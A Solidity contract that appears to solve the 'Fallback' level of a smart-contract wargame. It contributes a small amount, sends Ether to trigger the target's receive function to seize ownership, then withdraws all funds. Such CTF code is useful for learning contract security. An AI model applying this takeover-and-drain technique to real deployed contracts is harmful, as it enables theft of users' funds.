// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Fallback/Fallback.sol";

contract FallbackExploit {
    Fallback victim;

    constructor(address _victim) {
        victim = Fallback(payable(_victim));
    }

    function hack() public {
        // Step 1: contribute a small amount to increase contributions
        victim.contribute{value: 0.001 ether}();

        // Step 2: send Ether to trigger receive and become owner
        (bool sent, ) = address(victim).call{value: 1 ether}("");
        require(sent, "Failed to send Ether");

        // Step 3: withdraw all funds as the new owner
        victim.withdraw();
    }

    receive() external payable {}
}